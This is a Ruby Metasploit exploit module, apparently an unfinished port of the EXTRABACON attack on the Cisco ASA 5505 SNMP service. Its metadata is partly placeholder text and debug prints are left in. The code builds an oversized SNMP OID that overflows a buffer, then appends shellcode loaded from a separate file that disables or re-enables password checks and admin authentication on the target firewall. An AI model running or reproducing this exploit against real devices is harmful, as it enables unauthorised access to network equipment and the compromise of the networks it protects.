require 'msf/core'
require 'snmp'

class MetasploitModule < Msf::Exploit::Remote

include SNMP

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cisco ASA 5505 SNMP something something RCE.",
      'Description'    => %q{
        This module exploits stuff in a thing.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'NSA Tailored Access Operations',
        'William Webb <william_webb@rapid7.com>'   # MSF Module
      ],
      'References'     =>
      [
        [
          # Some refs might be cool
        ]
      ],
      'Platform'       => ['linux'],      # correct this at some point, somehow
      'Arch'           => ARCH_X86,
      'Targets'        =>
      [
        # Stuff and stuff
        [
          'Cisco ASA 5505',
          {
            'Version' => "asa804",
          },
        ]
      ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('RPORT', [true, "Destination port on target", 161]),
        OptString.new('RHOST', [true, "IP address of target ASA ", '']),
        OptString.new('Community', [true, "Community string", '']),
        OptEnum.new('PayloadOp', [true, 'The exploit operation',[ 'pass-disable',
                                                                  'pass-enable',], 
                                                                  'pass-disable']),
      ], self.class)

  end

  def hex(buf)
    return Rex::Text.to_hex_dump(buf)
  end

  # is there a better way to do this?

  def setup
    sc_file = File.join(Msf::Config.data_directory, "exploits", "EXTRABACON", "versions", "shellcode_" + target['Version'] + ".rb")
  
    begin
      load sc_file
    rescue LoadError    # shouldn't get here unless we enter something completely stupid
      print_error("Unable to load shellcode file! (#{sc_file})")
      print_error("Make sure the selected target is valid")
      exit
    end
  end

  def append_shellcode(p="")
    puts "Got here"
    if datastore['PayloadOp'] == "pass-disable"
      puts "A?"
      p << $payload_PMCHECK_DISABLE_byte
      p << $payload_AAAADMINAUTH_DISABLE_byte
      puts "A!"
    elsif datastore['PayloadOp'] == "pass-enable"
      puts "B?"
      p << $payload_PMCHECK_ENABLE_byte
      p << $payload_AAAADMINAUTH_ENABLE_byte
      puts "B!"
    else  
      return "unsupported"
    end
    puts "C!"
    p << $retn
    puts "D!"
    print_status("Appended shellcode for '#{datastore['PayloadOp']}' operation")
    return p
  end

  def exploit
    target_asa  = datastore['RHOST']
    target_port = datastore['RPORT']
    comm        = datastore['Community']
    
    head = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
    head_len = head.split('.').length

    wrapper = $preamble_snmp
    wrapper += "."
    wrapper += $launcher_snmp
    wrapper += "."
    wrapper += $postscript_snmp
    wrapper_len = wrapper.split('.').length
    wrapper += ".144" * (82 - wrapper_len)
    wrapper_len = wrapper.split('.').length

    overflow = [head, "95", wrapper, $my_ret_addr_snmp, $finder_snmp].join('.')
    # might need this, especially if we want to recreate all the error checking
    overflow_len = head_len + 1 + wrapper_len + $my_ret_addr_len + $finder_len
    
    print_status("overflow is currently:\n")
    print hex(overflow)

    # check for 'unsupported' ret value just to be complete
    pload = append_shellcode()
    print_status("pload:\n")
    print hex(pload)

    rand_request_id = Random.rand(0x80000..0x1fffffff)
    print_status("Random SNMP request-id: 0x#{rand_request_id.to_s(16)}")

    manager = SNMP::Manager.new(:Host => target_asa, :Port => target_port, :Community => comm, :Retries => 1)
    
    # first request
    # response = manager.get(["sysDescr.0", "sysUpTime.0", "sysName.0"])
    # response.each_varbind { |vb| puts vb.to_s}

    # second request
    # first varbind is sysDescr
    # exba_msg = SNMP(version=self.params.version,
    #                 community=self.params.community,
    #                 PDU=SNMPbulk( id=ASN1_INTEGER(self.params.request_id),
    #                 max_repetitions=1,
    #                 varbindlist=[
    #                   SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1"),
    #                   value=ASN1_STRING(payload)),
    #                   SNMPvarbind(oid=ASN1_OID(overflow)),
    #                 ]
    #                 )
    #               )     
    
    # also need to figure out an easy way to sub the payload offset into the PDU
    # see py line: 395

    vblist = VarBind.new("1.3.6.1.2.1.1.1", OctetString.new(pload))
    money_shot = VarBind.new(ObjectId.new(overflow))
    manager.next_request_id = rand_request_id
    response = manager.get_bulk(0, 1, [vblist, money_shot])
  end

end
